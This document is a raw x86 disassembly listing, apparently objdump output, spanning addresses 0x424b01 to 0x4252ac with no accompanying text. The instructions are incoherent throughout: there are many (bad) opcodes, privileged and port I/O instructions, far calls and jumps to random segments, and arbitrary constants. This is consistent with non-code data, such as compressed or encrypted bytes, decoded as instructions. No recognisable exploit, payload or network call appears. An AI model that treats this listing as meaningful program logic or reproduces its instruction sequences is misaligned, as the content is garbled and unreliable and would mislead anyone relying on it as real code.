  424b01:	(bad)  
  424b02:	cmp    DWORD PTR [bx+si],ecx
  424b05:	jae    0x424b56
  424b07:	and    DWORD PTR [esi-0x681ad998],0xffffff8a
  424b0e:	cli    
  424b0f:	add    al,0xde
  424b11:	mov    al,0x45
  424b13:	adc    BYTE PTR [ecx-0x22e1ace5],dl
  424b19:	aas    
  424b1a:	retf   
  424b1b:	adc    al,0x72
  424b1d:	mov    eax,0x1cc608f9
  424b22:	cmp    DWORD PTR [edx+0x53],ebx
  424b25:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  424b27:	into   
  424b28:	idiv   bl
  424b2a:	mov    al,ds:0x6d59e637
  424b2f:	mov    ds:0x18a25057,eax
  424b34:	mov    edx,0x894f3b47
  424b39:	into   
  424b3a:	xchg   edi,eax
  424b3b:	adc    dh,dl
  424b3d:	push   es
  424b3e:	aam    0xbc
  424b40:	mov    ebx,0xe318e6ed
  424b45:	aas    
  424b46:	jg     0x424b77
  424b48:	add    DWORD PTR ds:0xc21ab220,esp
  424b4e:	ja     0x424b1f
  424b50:	add    al,0x8a
  424b52:	test   dh,0xb3
  424b55:	mov    edx,0x278250cd
  424b5a:	mov    ds:0x1bef0434,al
  424b5f:	out    dx,eax
  424b60:	shl    BYTE PTR [esi+0x1f],1
  424b63:	gs jbe 0x424b6e
  424b66:	jmp    0x424be0
  424b68:	in     al,dx
  424b69:	stos   BYTE PTR es:[edi],al
  424b6a:	xchg   ebp,eax
  424b6b:	fadd   DWORD PTR [eax]
  424b6d:	lods   al,BYTE PTR ds:[esi]
  424b6e:	mov    cl,0xba
  424b70:	inc    edx
  424b71:	add    al,BYTE PTR [edi+0x5b05e01f]
  424b77:	mov    ebx,0x28207e95
  424b7c:	inc    edi
  424b7d:	inc    ecx
  424b7e:	hlt    
  424b7f:	(bad)  
  424b80:	fsub   st(1),st
  424b82:	(bad)  [ebp-0x60]
  424b85:	pop    esi
  424b86:	out    0xc4,eax
  424b88:	icebp  
  424b89:	push   ebp
  424b8a:	or     ah,BYTE PTR ds:0x9be3
  424b8f:	cmp    BYTE PTR [esi-0x5b83114b],bh
  424b95:	ins    BYTE PTR es:[edi],dx
  424b96:	dec    eax
  424b97:	stc    
  424b98:	mov    ds:0x1024859a,al
  424b9d:	sti    
  424b9e:	pop    esp
  424b9f:	test   BYTE PTR [edi+0x2d54472],cl
  424ba5:	loopne 0x424bee
  424ba7:	pop    eax
  424ba8:	retf   
  424ba9:	jnp    0x424b8a
  424bab:	sub    al,bl
  424bad:	push   eax
  424bae:	sahf   
  424baf:	pusha  
  424bb0:	(bad)  
  424bb1:	fs cwde 
  424bb3:	jp     0x424ba1
  424bb5:	(bad)  
  424bb6:	sbb    al,BYTE PTR [ebp+0x2e]
  424bb9:	mov    eax,DWORD PTR [edx]
  424bbb:	popf   
  424bbc:	mov    DWORD PTR [ecx-0x2e94431e],ecx
  424bc2:	sbb    DWORD PTR ds:0x956d111f,esp
  424bc8:	leave  
  424bc9:	jp     0x424bb7
  424bcb:	inc    esp
  424bcc:	aam    0x24
  424bce:	(bad)
  424bd1:	xor    DWORD PTR [ecx],eax
  424bd3:	enter  0x2883,0x8a
  424bd7:	out    dx,eax
  424bd8:	push   es
  424bd9:	jp     0x424c39
  424bdb:	and    BYTE PTR [ebp-0x1312ee90],bh
  424be1:	add    ebp,0x6003af04
  424be7:	ins    DWORD PTR es:[edi],dx
  424be8:	ret    0x4cd0
  424beb:	mov    esp,DWORD PTR [edx]
  424bed:	xor    al,cl
  424bef:	or     BYTE PTR [ecx-0x58],cl
  424bf2:	add    al,0x44
  424bf4:	aad    0xe2
  424bf6:	pop    esi
  424bf7:	sahf   
  424bf8:	dec    esi
  424bf9:	push   esi
  424bfa:	mov    esp,0x6cb801b4
  424bff:	pop    ds
  424c00:	jp     0x424b8c
  424c02:	lds    ecx,FWORD PTR [edi+ebp*1+0x49]
  424c06:	mov    cl,0x38
  424c08:	rol    BYTE PTR [ebx],1
  424c0a:	mov    WORD PTR [ebx-0x1b8bf70d],gs
  424c10:	mov    WORD PTR [esi+0x58],?
  424c13:	(bad)  
  424c14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c15:	add    DWORD PTR [ebp+0x4a],ecx
  424c18:	stc    
  424c19:	ds dec esp
  424c1b:	pushf  
  424c1c:	ret    0x943d
  424c1f:	jae    0x424c79
  424c21:	fsubrp st(0),st
  424c23:	pop    esp
  424c24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c25:	mov    ebp,DWORD PTR [eax-0x7a]
  424c28:	fst    st(3)
  424c2a:	mov    dh,0x88
  424c2c:	push   eax
  424c2d:	popa   
  424c2e:	jb     0x424bc4
  424c30:	adc    edi,ebx
  424c32:	addr16 and eax,0xe578a86c
  424c38:	fcomi  st,st(5)
  424c3a:	cmp    DWORD PTR [edi],ebp
  424c3c:	add    BYTE PTR [eax+0x21],cl
  424c3f:	inc    edx
  424c40:	mov    eax,ds:0x7e6578b1
  424c45:	add    ebp,0x3f
  424c48:	stos   DWORD PTR es:[edi],eax
  424c49:	aad    0x51
  424c4b:	iret   
  424c4c:	jb     0x424c4f
  424c4e:	dec    edi
  424c4f:	jo     0x424cac
  424c51:	dec    esp
  424c52:	push   ecx
  424c53:	in     al,dx
  424c54:	leave  
  424c55:	mov    bh,BYTE PTR [edx+0x9]
  424c58:	mov    al,0x1
  424c5a:	cli    
  424c5b:	ret    
  424c5c:	in     al,dx
  424c5d:	mul    DWORD PTR [ebp+0x44d76c22]
  424c63:	inc    esp
  424c64:	mov    es,WORD PTR [eax-0x4b4f2c]
  424c6a:	sub    eax,0x7ff75252
  424c6f:	fnstsw WORD PTR [ecx-0x1f0a4a4]
  424c75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c76:	adc    ebx,DWORD PTR [ebx]
  424c78:	mov    WORD PTR [eax-0x58fe5097],?
  424c7e:	ins    BYTE PTR es:[edi],dx
  424c7f:	stos   BYTE PTR es:[edi],al
  424c80:	cmp    cl,BYTE PTR [ebx]
  424c82:	jbe    0x424c40
  424c84:	push   esi
  424c85:	dec    eax
  424c86:	nop
  424c87:	outs   dx,DWORD PTR ds:[esi]
  424c88:	lods   eax,DWORD PTR ds:[esi]
  424c89:	rcl    DWORD PTR [eax+0x5b2dd46],1
  424c8f:	ja     0x424c50
  424c91:	pop    edx
  424c92:	pop    esi
  424c93:	ds and eax,0x552a039f
  424c99:	out    dx,eax
  424c9a:	sub    al,0xa1
  424c9c:	test   al,0x15
  424c9e:	xor    BYTE PTR [esi+0x50],bl
  424ca1:	in     al,dx
  424ca2:	js     0x424cd3
  424ca4:	sti    
  424ca5:	cli    
  424ca6:	imul   edi,DWORD PTR [ebx+0x71],0x24e24788
  424cad:	int3   
  424cae:	popf   
  424caf:	mov    ah,0x3c
  424cb1:	jno    0x424c67
  424cb3:	push   es
  424cb4:	xor    dh,ah
  424cb6:	pushf  
  424cb7:	pop    esp
  424cb8:	loop   0x424d24
  424cba:	xor    ch,BYTE PTR [esi-0x63]
  424cbd:	jg     0x424d0e
  424cbf:	mov    ds:0x250b3413,al
  424cc4:	jno    0x424cb1
  424cc6:	(bad)  
  424cc7:	div    BYTE PTR [ebp+0x1cba8067]
  424ccd:	mov    DWORD PTR [ebp+0x7142f5bd],0xce2360d3
  424cd7:	cmp    esp,DWORD PTR [edx]
  424cd9:	jp     0x424d0b
  424cdb:	in     al,0x8b
  424cdd:	mov    bl,0x23
  424cdf:	xchg   di,ax
  424ce1:	and    ebp,DWORD PTR [ebx]
  424ce3:	sub    eax,0xdcdf65e5
  424ce8:	retf   0xf588
  424ceb:	(bad)  
  424cec:	mov    WORD PTR [ebp+0x3241dd16],ds
  424cf2:	mov    edi,0x161bdb00
  424cf7:	loopne 0x424d68
  424cf9:	mov    ebx,0x469e8fe6
  424cfe:	fnsave [edx-0x64]
  424d01:	xor    BYTE PTR [ebp+0x37eeef40],bl
  424d07:	icebp  
  424d08:	jbe    0x424d60
  424d0a:	jp     0x424d2a
  424d0c:	int3   
  424d0d:	jb     0x424d5e
  424d0f:	es pusha 
  424d11:	jae    0x424ca9
  424d13:	retf   0xcd60
  424d16:	sub    eax,0xe86df01d
  424d1b:	cmp    eax,esp
  424d1d:	rol    DWORD PTR [edx-0x9],cl
  424d20:	imul   edi,esi,0x15
  424d23:	mov    al,0xb9
  424d25:	jl     0x424d36
  424d27:	jae    0x424d03
  424d29:	stc    
  424d2a:	loopne 0x424d4c
  424d2c:	push   edi
  424d2d:	mov    bl,0x24
  424d2f:	ret    0x4697
  424d32:	jecxz  0x424d1c
  424d34:	mov    esp,DWORD PTR [ecx+0x6b]
  424d37:	inc    eax
  424d38:	mov    ch,0x2d
  424d3a:	fmulp  st(1),st
  424d3c:	xor    esp,eax
  424d3e:	scas   al,BYTE PTR es:[edi]
  424d3f:	jns    0x424d34
  424d41:	call   0x944f:0xcd4a773e
  424d48:	scas   al,BYTE PTR es:[edi]
  424d49:	pop    ebp
  424d4a:	adc    al,0x2f
  424d4c:	int    0xb7
  424d4e:	retf   
  424d4f:	addr16 mov cl,0x3c
  424d52:	lods   eax,DWORD PTR ds:[esi]
  424d53:	mov    ecx,0x778df5e6
  424d58:	inc    esi
  424d59:	arpl   WORD PTR [ecx],sp
  424d5b:	shl    DWORD PTR [eax+eiz*1+0x33],cl
  424d5f:	jns    0x424d5e
  424d61:	repz scas eax,DWORD PTR es:[edi]
  424d63:	es ss push es
  424d66:	push   ss
  424d67:	sbb    eax,0x91f82a7e
  424d6c:	retf   
  424d6d:	je     0x424cf2
  424d6f:	jo     0x424de1
  424d71:	jle    0x424d5c
  424d73:	std    
  424d74:	xchg   ebp,eax
  424d75:	mov    ecx,0xf53a4
  424d7a:	add    BYTE PTR [eax],al
  424d7c:	stos   BYTE PTR es:[edi],al
  424d7d:	jo     0x424d5f
  424d7f:	dec    ecx
  424d80:	cli    
  424d81:	fldcw  WORD PTR [ebx-0x35bf70d]
  424d87:	loopne 0x424d8c
  424d89:	mov    ds:0xc6c0a9c9,eax
  424d8e:	add    DWORD PTR [eax],eax
  424d90:	test   DWORD PTR [edx],eax
  424d92:	add    BYTE PTR [eax],al
  424d94:	sti    
  424d95:	adc    BYTE PTR [edx-0x5eca9183],cl
  424d9b:	mov    edi,0x69f2c812
  424da0:	jmp    0x735c:0xc5789ccf
  424da7:	aas    
  424da8:	inc    edx
  424da9:	mov    ah,0xc
  424dab:	push   esp
  424dac:	xor    al,0x39
  424dae:	lea    ebx,[eax]
  424db0:	es xor eax,0x1762fddd
  424db6:	xor    BYTE PTR [ebp+0x307889d7],0xf
  424dbd:	cld    
  424dbe:	(bad)  
  424dbf:	test   al,0x3f
  424dc1:	dec    BYTE PTR [esi+eiz*1]
  424dc4:	fwait
  424dc5:	test   ch,dl
  424dc7:	std    
  424dc8:	or     DWORD PTR [edx+ebp*4-0x727d89a0],ebp
  424dcf:	push   cs
  424dd0:	pcmpgtw mm5,QWORD PTR [ecx]
  424dd3:	ins    DWORD PTR es:[edi],dx
  424dd4:	in     eax,dx
  424dd5:	es mov esp,0x33c42ef9
  424ddb:	add    BYTE PTR [ecx+0x3c0d5fe],al
  424de1:	sbb    al,0xc1
  424de3:	mov    ah,0xab
  424de5:	xchg   edx,edi
  424de7:	ret    0x19fc
  424dea:	retf   0xfb7f
  424ded:	cld    
  424dee:	inc    edi
  424def:	add    BYTE PTR [eax+0x1b],0xc6
  424df3:	adc    eax,0x29db8c27
  424df8:	push   edi
  424df9:	sub    ebx,esp
  424dfb:	fistp  DWORD PTR ds:0x7aa79787
  424e01:	sub    DWORD PTR [ecx+ebx*1],0xffffffde
  424e05:	dec    dl
  424e07:	aas    
  424e08:	mov    bl,0x6c
  424e0a:	xor    BYTE PTR [ebp+eax*2+0x20],0x5d
  424e0f:	fidivr WORD PTR [ebx]
  424e11:	nop
  424e12:	les    eax,FWORD PTR ds:0x40e44a8
  424e18:	gs fdiv st(3),st
  424e1b:	out    dx,al
  424e1c:	jo     0x424e6f
  424e1e:	cli    
  424e1f:	inc    eax
  424e20:	push   es
  424e21:	popf   
  424e22:	xchg   DWORD PTR [ebx],esp
  424e24:	dec    esi
  424e25:	mov    ds:0xf1b074d5,eax
  424e2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424e2b:	mov    esp,0x284139bf
  424e30:	je     0x424dd2
  424e32:	xchg   ebp,eax
  424e33:	mov    bh,0x74
  424e35:	mov    esi,0xeaf110ef
  424e3a:	test   DWORD PTR [eax],eax
  424e3c:	iret   
  424e3d:	xor    BYTE PTR [ebx],al
  424e3f:	pop    ebx
  424e40:	retf   0xd1a3
  424e43:	sub    cl,BYTE PTR [ecx]
  424e45:	adc    esp,DWORD PTR [ebx-0x63fe43af]
  424e4b:	xacquire xchg BYTE PTR [esi+0x3abbf2c0],cl
  424e52:	xchg   edi,eax
  424e53:	retf   
  424e54:	dec    edx
  424e55:	mov    bh,0x3d
  424e57:	mov    esp,es
  424e59:	add    ebx,DWORD PTR [edi]
  424e5b:	mov    ebx,ebx
  424e5d:	xor    DWORD PTR [ecx],ebx
  424e5f:	dec    esp
  424e60:	jmp    0x424e7a
  424e62:	in     eax,0x95
  424e64:	xor    DWORD PTR [ebx-0x10],ecx
  424e67:	dec    esi
  424e68:	mov    ch,0x34
  424e6a:	fwait
  424e6b:	(bad)  
  424e6c:	mov    eax,0x76727a32
  424e71:	mov    eax,0x6cdabb9f
  424e76:	ss cmp eax,0x1e608a12
  424e7c:	stos   WORD PTR es:[edi],ax
  424e7e:	lods   eax,DWORD PTR ds:[esi]
  424e7f:	add    cl,BYTE PTR [esi+0x76]
  424e82:	cdq    
  424e83:	daa    
  424e84:	pop    es
  424e85:	nop
  424e86:	ja     0x424ef0
  424e88:	adc    al,0xbb
  424e8a:	dec    ecx
  424e8b:	pusha  
  424e8c:	cmp    BYTE PTR [edi+0x509f084d],dl
  424e92:	pop    edi
  424e93:	push   es
  424e94:	sub    BYTE PTR [edi+0x6b197e2a],bh
  424e9a:	je     0x424e83
  424e9c:	retf   
  424e9d:	jmp    0xca2e6e22
  424ea2:	in     al,0x4d
  424ea4:	jae    0x424eb2
  424ea6:	push   edx
  424ea7:	into   
  424ea8:	mov    eax,ds:0x27362d33
  424ead:	test   ebp,ecx
  424eaf:	mov    ebp,0x23bdc666
  424eb4:	push   eax
  424eb5:	jmp    0x424e69
  424eb7:	xchg   ecx,eax
  424eb8:	push   eax
  424eb9:	or     ebx,edx
  424ebb:	and    dh,ah
  424ebd:	cmp    ch,ah
  424ebf:	lods   al,BYTE PTR ds:[esi]
  424ec0:	xchg   BYTE PTR [esi+0x6bc800a4],ah
  424ec6:	repz jp 0x424f1d
  424ec9:	mov    dh,0xf2
  424ecb:	jmp    0xce2b:0xb5c58606
  424ed2:	das    
  424ed3:	and    al,0x8a
  424ed5:	outs   dx,BYTE PTR ds:[esi]
  424ed6:	retf   0x9bb1
  424ed9:	push   0x3f37fcae
  424ede:	mov    ah,0xe8
  424ee0:	mov    dl,0xaa
  424ee2:	daa    
  424ee3:	lock gs fwait
  424ee6:	popf   
  424ee7:	in     al,0x6e
  424ee9:	imul   edi,esp,0xffffff8a
  424eec:	and    eax,0x5769c7e4
  424ef1:	rcl    DWORD PTR [esi],cl
  424ef3:	cmp    ecx,ebp
  424ef5:	xchg   edx,eax
  424ef6:	mov    al,0x4d
  424ef8:	int3   
  424ef9:	popa   
  424efa:	mov    edi,0xc67ae8ac
  424eff:	sbb    al,BYTE PTR [edi+edx*4]
  424f02:	hlt    
  424f03:	jns    0x424efa
  424f05:	call   0xfed:0xa1bc0f55
  424f0c:	jae    0x424ee9
  424f0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f0f:	fadd   QWORD PTR [ebp-0x254af655]
  424f15:	or     esi,0x27
  424f18:	push   ebp
  424f19:	push   ds
  424f1a:	test   al,0xca
  424f1c:	pop    edi
  424f1d:	xor    BYTE PTR [esi-0x10],ah
  424f20:	xchg   BYTE PTR [esi],dl
  424f22:	mov    cl,0x81
  424f24:	pop    es
  424f25:	push   ebx
  424f26:	xchg   DWORD PTR [edi],edi
  424f28:	(bad)  fs:[esi-0x1e435b33]
  424f2f:	dec    ebp
  424f30:	cs fst st(1)
  424f33:	fisub  WORD PTR [esi]
  424f35:	sbb    DWORD PTR [esi+edi*8],0x7
  424f39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f3a:	cs fmul st(6),st
  424f3d:	(bad)  ds:[edx+ecx*2-0x6dfa73bc]
  424f45:	cmp    BYTE PTR [edi+0x3adc1d15],dl
  424f4b:	mov    dh,0x1b
  424f4d:	push   ss
  424f4e:	out    dx,eax
  424f4f:	inc    edi
  424f50:	push   edi
  424f51:	jecxz  0x424fab
  424f53:	add    BYTE PTR [edi+0x16],dl
  424f56:	cwde   
  424f57:	inc    ebx
  424f58:	stos   DWORD PTR es:[edi],eax
  424f59:	cmp    bl,bh
  424f5b:	les    esi,FWORD PTR [ecx-0x69]
  424f5e:	or     dl,ah
  424f60:	pusha  
  424f61:	xchg   DWORD PTR [edi+0x25508a15],eax
  424f67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f68:	rcl    BYTE PTR [esi-0x6686abcd],cl
  424f6e:	loop   0x424fee
  424f70:	dec    ebp
  424f71:	push   ecx
  424f72:	enter  0x7b6c,0x5f
  424f76:	aas    
  424f77:	mov    ecx,0x494ef735
  424f7c:	pop    eax
  424f7d:	push   cs
  424f7e:	fstp   TBYTE PTR [edi+eax*2+0x16429154]
  424f85:	xor    DWORD PTR ds:0xf14015c1,ecx
  424f8b:	or     BYTE PTR [ebx+0x283377c4],0x7
  424f92:	add    al,0x6
  424f94:	mov    dh,0xb1
  424f96:	jmp    0x271f078
  424f9b:	(bad)  
  424f9c:	ffreep st(5)
  424f9e:	mov    al,0xe3
  424fa0:	loope  0x424f68
  424fa2:	add    al,0xaa
  424fa4:	cli    
  424fa5:	jbe    0x425006
  424fa7:	sub    BYTE PTR [edi+0x7b96ac4e],ch
  424fad:	cmp    eax,0x1ac2cee7
  424fb2:	lahf   
  424fb3:	push   ss
  424fb4:	xlat   BYTE PTR ds:[ebx]
  424fb5:	mov    ebp,0x4b5d683
  424fba:	add    eax,DWORD PTR [esi-0x7d]
  424fbd:	push   ss
  424fbe:	xor    al,0x68
  424fc0:	jne    0x424fe4
  424fc2:	jp     0x424fc3
  424fc4:	and    DWORD PTR [edx],esp
  424fc6:	sub    esp,eax
  424fc8:	cmp    DWORD PTR [ebx],ecx
  424fca:	jg     0x424f6e
  424fcc:	pop    ss
  424fcd:	xor    BYTE PTR [edx-0x1f],al
  424fd0:	or     eax,0xde8a85db
  424fd5:	enter  0x65ca,0xd2
  424fd9:	xchg   edx,eax
  424fda:	rcl    edi,0x3a
  424fdd:	imul   edx,DWORD PTR [eax+0x70346a9d],0xf22a4317
  424fe7:	pop    ecx
  424fe8:	jns    0x424ffe
  424fea:	and    ch,BYTE PTR ss:[ebp+0x1ffa6b4]
  424ff1:	mov    dl,0x30
  424ff3:	aaa    
  424ff4:	cld    
  424ff5:	rcr    DWORD PTR [edi+0xd],0x18
  424ff9:	(bad)  [ebx]
  424ffb:	pop    esi
  424ffc:	dec    ebp
  424ffd:	inc    BYTE PTR [ebx]
  424fff:	jns    0x425039
  425001:	jne    0x424ff8
  425003:	sbb    al,0xd8
  425005:	arpl   WORD PTR [ebp+edx*4+0x34],di
  425009:	pop    edi
  42500a:	mov    ds:0xf4b81d4a,eax
  42500f:	pop    es
  425010:	stos   DWORD PTR es:[edi],eax
  425011:	jl     0x425001
  425013:	adc    al,0x7b
  425015:	push   eax
  425016:	ret    0xdd19
  425019:	add    BYTE PTR [eax],al
  42501b:	add    BYTE PTR [edx-0x79],cl
  42501e:	push   edx
  42501f:	dec    esp
  425020:	(bad)  
  425022:	pop    esi
  425023:	xchg   eax,esp
  425025:	js     0x424fa8
  425027:	mov    ebx,0x63177fe8
  42502c:	inc    ebp
  42502d:	leave  
  42502e:	add    DWORD PTR [eax],eax
  425030:	test   DWORD PTR [edx],eax
  425032:	add    BYTE PTR [eax],al
  425034:	sti    
  425035:	inc    esp
  425036:	sbb    DWORD PTR [eax+ebp*4],edi
  425039:	mov    ah,0x9c
  42503b:	mov    ebx,0xd891a33a
  425040:	dec    edx
  425041:	(bad)  
  425042:	sahf   
  425043:	mov    ebx,0x25daf18b
  425048:	cld    
  425049:	bound  edi,QWORD PTR [edx]
  42504b:	mov    bh,cl
  42504d:	fstp   st(4)
  42504f:	xchg   edi,eax
  425050:	cli    
  425051:	mov    ch,0x1e
  425053:	in     eax,dx
  425054:	cwde   
  425055:	stc    
  425056:	icebp  
  425057:	cmp    BYTE PTR [ecx],bl
  425059:	out    dx,eax
  42505a:	and    al,0x8b
  42505c:	mov    dh,0x2f
  42505e:	cmp    DWORD PTR [ecx+0x549636f7],esi
  425064:	sbb    eax,DWORD PTR [edi+edx*8+0x52]
  425068:	xor    DWORD PTR [edi+edx*1+0x7c7d400a],eax
  42506f:	add    ecx,edx
  425071:	dec    edx
  425072:	fstp   DWORD PTR [eax+0x4badb774]
  425078:	es pop esi
  42507a:	jmp    0xcb4937cc
  42507f:	xchg   esp,eax
  425080:	adc    ah,BYTE PTR [ebp-0x14d1bbd5]
  425086:	sar    DWORD PTR [eax-0x4b],1
  425089:	js     0x4250f4
  42508b:	xor    al,0x35
  42508d:	pop    edx
  42508e:	xchg   edx,esi
  425090:	mov    dl,dh
  425092:	cli    
  425093:	aam    0x8
  425095:	pusha  
  425096:	push   eax
  425097:	data16 loope 0x425056
  42509a:	or     eax,0x4fa40182
  42509f:	les    esp,FWORD PTR [esi-0x6d8e1308]
  4250a5:	push   ebx
  4250a6:	ss dec ebx
  4250a8:	sub    eax,0x8939e397
  4250ad:	push   edx
  4250ae:	neg    bh
  4250b0:	into   
  4250b1:	dec    edx
  4250b2:	push   ds
  4250b3:	pop    edi
  4250b4:	pop    ss
  4250b5:	xchg   edx,eax
  4250b6:	loop   0x425074
  4250b8:	push   esp
  4250b9:	stos   BYTE PTR es:[edi],al
  4250ba:	les    ecx,FWORD PTR fs:[edx]
  4250bd:	hlt    
  4250be:	sahf   
  4250bf:	retf   
  4250c0:	imul   edi,DWORD PTR [ecx],0xc3694f06
  4250c6:	std    
  4250c7:	jg     0x42506e
  4250c9:	scas   al,BYTE PTR es:[edi]
  4250ca:	pop    edx
  4250cb:	adc    esp,DWORD PTR [esp+eax*1]
  4250ce:	xor    ebx,DWORD PTR [ebx-0x80]
  4250d1:	sbb    eax,0x7fee78d6
  4250d6:	cdq    
  4250d7:	dec    eax
  4250d8:	mov    dl,0x6a
  4250da:	xchg   esp,eax
  4250db:	pop    ss
  4250dc:	and    BYTE PTR [edi-0x27],0xda
  4250e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4250e1:	stos   DWORD PTR es:[edi],eax
  4250e2:	xor    DWORD PTR [ebp-0xe],edi
  4250e5:	pop    ebx
  4250e6:	lea    eax,[edx]
  4250e8:	or     al,0x99
  4250ea:	data16 and BYTE PTR [ebp+0x410bfab6],ah
  4250f1:	fstp   DWORD PTR [edx]
  4250f3:	aad    0xfd
  4250f5:	sti    
  4250f6:	(bad)  
  4250f7:	out    dx,eax
  4250f8:	push   eax
  4250f9:	sub    edi,eax
  4250fb:	or     esp,esp
  4250fd:	add    BYTE PTR [ebx+0x51607dac],dh
  425103:	add    eax,0x59d6a7f2
  425108:	test   eax,0xe3039ed1
  42510d:	or     BYTE PTR [eax+0x74d12e69],0xc8
  425114:	cwde   
  425115:	fdivr  DWORD PTR [ecx+0x76]
  425118:	sub    BYTE PTR [edi+ecx*2],ah
  42511b:	or     edx,DWORD PTR [esi]
  42511d:	mov    ebx,0xc7ad0e23
  425122:	aad    0x7f
  425124:	pop    ebx
  425125:	adc    eax,0xb1b8f78
  42512a:	add    al,0xa4
  42512c:	mov    BYTE PTR [ebp+0x3f],ah
  42512f:	mov    ch,BYTE PTR [edi]
  425131:	jge    0x425175
  425133:	pop    ecx
  425134:	in     eax,0x5a
  425136:	js     0x425142
  425138:	xchg   ebp,eax
  425139:	dec    ebx
  42513a:	pushf  
  42513b:	jo     0x4251ac
  42513d:	lods   al,BYTE PTR ds:[esi]
  42513e:	leave  
  42513f:	sbb    dh,al
  425141:	push   0xcf63d40d
  425146:	nop
  425147:	push   es
  425148:	ret    
  425149:	fcomp  st(5)
  42514b:	cmp    ch,BYTE PTR es:[ecx+0x32]
  42514f:	jge    0x4251bb
  425151:	xlat   BYTE PTR ds:[ebx]
  425152:	mov    edx,0x391a871e
  425157:	lods   al,BYTE PTR ds:[esi]
  425158:	mov    bh,0x4a
  42515a:	sub    al,0xf6
  42515c:	lock mov esi,0x7e5b166
  425162:	xchg   esi,eax
  425163:	xor    DWORD PTR fs:[eax+0x6a],esp
  425167:	adc    DWORD PTR [esi+0xa429151],edi
  42516d:	inc    bh
  42516f:	xor    DWORD PTR [ecx+0x12],edx
  425172:	test   eax,0x50bcf640
  425177:	adc    esi,esp
  425179:	mov    esi,0x431fcc96
  42517e:	(bad)
  425182:	push   ecx
  425183:	fiadd  DWORD PTR [esi-0x32]
  425186:	adc    edx,DWORD PTR [edx]
  425188:	push   edi
  425189:	pushf  
  42518a:	xchg   esp,edi
  42518c:	mov    edx,0xdec35700
  425191:	repnz adc al,0xe6
  425194:	imul   eax,DWORD PTR [ebx],0x4dcd9346
  42519a:	test   BYTE PTR [eax+edx*1-0x1d087797],ah
  4251a1:	lods   al,BYTE PTR ds:[esi]
  4251a2:	cs mov al,0xfb
  4251a5:	cmp    eax,0xfbf4191d
  4251aa:	stc    
  4251ab:	data16 das 
  4251ad:	push   esp
  4251ae:	fucomi st,st(5)
  4251b0:	hlt    
  4251b1:	mov    DWORD PTR [esp+edx*8+0x1fe96bdd],ebp
  4251b8:	jp     0x42517b
  4251ba:	cli    
  4251bb:	mov    ah,0x91
  4251bd:	jge    0x425204
  4251bf:	stos   BYTE PTR es:[edi],al
  4251c0:	ret    0x767d
  4251c3:	adc    bh,0xd8
  4251c6:	jp     0x4251b9
  4251c8:	push   0x206a3fa5
  4251cd:	and    bh,ch
  4251cf:	dec    ebx
  4251d0:	or     edx,DWORD PTR [edx+0x5f]
  4251d3:	dec    ebx
  4251d4:	loope  0x42516d
  4251d6:	cmc    
  4251d7:	or     BYTE PTR [edi+0x30176aab],al
  4251dd:	pusha  
  4251de:	dec    ebx
  4251df:	and    BYTE PTR [eax-0x10b6a48e],al
  4251e5:	mov    cl,0xad
  4251e7:	daa    
  4251e8:	loope  0x4251cd
  4251ea:	add    dl,BYTE PTR [esi+ebp*4-0x3d]
  4251ee:	nop
  4251ef:	arpl   ax,cx
  4251f1:	or     al,0xe
  4251f3:	push   edi
  4251f4:	out    dx,eax
  4251f5:	jb     0x4251d1
  4251f7:	sub    edi,DWORD PTR [eax+0x3c]
  4251fa:	adc    eax,0x8264ac18
  4251ff:	push   ecx
  425200:	ret    
  425201:	push   ebx
  425202:	mov    cl,0x7a
  425204:	in     al,dx
  425205:	rcr    DWORD PTR [esi],0x82
  425208:	xor    BYTE PTR [edx-0x6172e11f],bl
  42520e:	ret    
  42520f:	or     dh,dh
  425211:	addr16 mov eax,0xd8ab76f5
  425217:	sbb    ebx,DWORD PTR [ebx-0x1b]
  42521a:	in     al,dx
  42521b:	and    DWORD PTR [ebx-0x6a59fad6],esi
  425221:	push   ds
  425222:	ins    DWORD PTR es:[edi],dx
  425223:	hlt    
  425224:	fwait
  425225:	in     al,dx
  425226:	hlt    
  425227:	das    
  425228:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425229:	cs jns 0x4251c4
  42522c:	inc    esi
  42522d:	pop    ebx
  42522e:	jnp    0x425297
  425230:	mov    esi,0xf9b33070
  425235:	aas    
  425236:	cmp    al,0xd4
  425238:	out    dx,al
  425239:	pop    ecx
  42523a:	inc    ebp
  42523b:	mov    ds,esi
  42523d:	or     cl,dh
  42523f:	xchg   BYTE PTR [esi-0x61bca8c],al
  425245:	add    bl,BYTE PTR [ebp-0x80]
  425248:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425249:	push   ebx
  42524a:	xchg   DWORD PTR [edi],esp
  42524c:	push   0x44ce37c5
  425251:	ror    ch,1
  425253:	mov    dh,0x1d
  425255:	fisub  WORD PTR ds:[ebx]
  425258:	jno    0x425217
  42525a:	push   ds
  42525b:	bswap  ebp
  42525d:	pop    ds
  42525e:	adc    al,0x8e
  425260:	xchg   DWORD PTR [esi-0x80],eax
  425263:	cmc    
  425264:	pop    edx
  425265:	xchg   BYTE PTR [esi-0x50],bh
  425268:	fild   QWORD PTR [edi+eiz*4-0x11]
  42526c:	xor    DWORD PTR [esi],0x1a5919d2
  425272:	stos   BYTE PTR es:[edi],al
  425273:	shr    BYTE PTR [eax],0xe4
  425276:	sahf   
  425277:	adc    eax,0x439b796c
  42527c:	add    DWORD PTR [ebp+eax*2+0x79b58764],eax
  425283:	inc    eax
  425284:	fisub  WORD PTR [edx-0x5b]
  425287:	mov    esp,0x90aa4291
  42528c:	retf   
  42528d:	ins    DWORD PTR es:[edi],dx
  42528e:	popa   
  42528f:	or     eax,0xe62d36f0
  425294:	pop    esi
  425295:	jnp    0x425263
  425297:	popf   
  425298:	and    edx,ecx
  42529a:	popf   
  42529b:	fsubr  st,st(5)
  42529d:	stos   DWORD PTR es:[edi],eax
  42529e:	into   
  42529f:	mov    esp,0xa2cbfc57
  4252a4:	fidivr DWORD PTR [edx+edx*8-0x998d744]
  4252ab:	sti    
  4252ac:	pop    ebx
